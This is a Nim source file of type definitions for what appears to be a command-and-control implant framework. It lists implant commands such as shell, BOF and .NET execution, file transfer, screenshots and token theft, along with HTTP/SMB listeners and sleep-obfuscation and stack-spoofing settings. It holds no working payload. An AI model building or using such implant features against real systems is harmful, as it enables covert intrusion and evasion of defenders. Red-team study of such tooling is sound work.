import ../common/toml/toml 

type    
    Uuid* = uint32
    Bytes* = seq[byte]
    Key* = array[32, byte]
    Iv* = array[12, byte]
    AuthenticationTag* = array[16, byte]
    KeyRC4* = array[16, byte]

type 
    KeyPair* = object 
        privateKey*: Key 
        publicKey*: Key

    Profile* = TomlTableRef

type 
    CommandType* {.size: sizeof(uint16).} = enum 
        CMD_EXIT = "exit"
        CMD_SELF_DESTRUCT = "self-destruct"
        CMD_SLEEP = "sleep"
        CMD_JITTER = "jitter"
        CMD_SLEEPMASK = "sleepmask"
        CMD_LINK = "link"
        CMD_UNLINK = "unlink"
        CMD_SHELL = "shell"
        CMD_BOF = "bof"
        CMD_DOTNET = "dotnet"
        CMD_DOWNLOAD = "download"
        CMD_UPLOAD = "upload"
        CMD_SCREENSHOT = "screenshot"
        CMD_PWD = "pwd"
        CMD_CD = "cd"
        CMD_LS = "ls"
        CMD_RM = "rm"
        CMD_RMDIR = "rmdir"
        CMD_MOVE = "move"
        CMD_COPY = "copy"
        CMD_PS = "ps"
        CMD_ENV = "env" 
        CMD_MAKE_TOKEN = "make-token"
        CMD_STEAL_TOKEN = "steal-token"
        CMD_REV2SELF = "rev2self"
        CMD_TOKEN_INFO = "token-info"
        CMD_ENABLE_PRIV = "enable-privilege"
        CMD_DISABLE_PRIV = "disable-privilege"

    ModuleType* = enum 
        MODULE_SHELL = 1'u32 
        MODULE_BOF = 2'u32
        MODULE_DOTNET = 4'u32
        MODULE_FILESYSTEM = 8'u32 
        MODULE_FILETRANSFER = 16'u32
        MODULE_SCREENSHOT = 32'u32
        MODULE_SYSTEMINFO = 64'u32 
        MODULE_TOKEN = 128'u32

    ListenerType* {.size: sizeof(uint8).} = enum
        LISTENER_HTTP = "HTTP"
        LISTENER_SMB = "SMB"

    SleepObfuscationTechnique* = enum 
        NONE = 0'u8
        EKKO = 1'u8 
        ZILEAN = 2'u8
        FOLIAGE = 3'u8
    
    DirectoryEntryFlags* = enum
        IS_DIR = 1'u8
        IS_HIDDEN = 2'u8
        IS_READONLY = 4'u8
        IS_ARCHIVE = 8'u8
        IS_SYSTEM = 16'u8
    
    LogType* {.size: sizeof(uint8).} = enum 
        LOG_INFO = "[INFO] "
        LOG_ERROR = "[FAIL] "
        LOG_SUCCESS = "[DONE] "
        LOG_WARNING = "[WARN] "
        LOG_COMMAND = "[>>>>] "
        LOG_OUTPUT = ""
        LOG_INFO_SHORT = "[*] "
        LOG_ERROR_SHORT = "[-] "
        LOG_SUCCESS_SHORT = "[+] "
        LOG_WARNING_SHORT = "[!] "

    ArgType* = enum 
        STRING = 0'u8
        INT = 1'u8
        BOOL = 2'u8 
        BINARY = 3'u8 

    PacketType* = enum 
        MSG_TASK = 0'u8
        MSG_RESULT = 1'u8 
        MSG_REGISTER = 2'u8
        MSG_HEARTBEAT = 100'u8

type 
    WorkingHours* = ref object 
        enabled*: bool
        startHour*: int32 
        startMinute*: int32
        endHour*: int32
        endMinute*: int32

    SleepSettings* = ref object 
        sleepDelay*: uint32
        jitter*: uint32
        sleepTechnique*: SleepObfuscationTechnique
        spoofStack*: bool
        workingHours*: WorkingHours
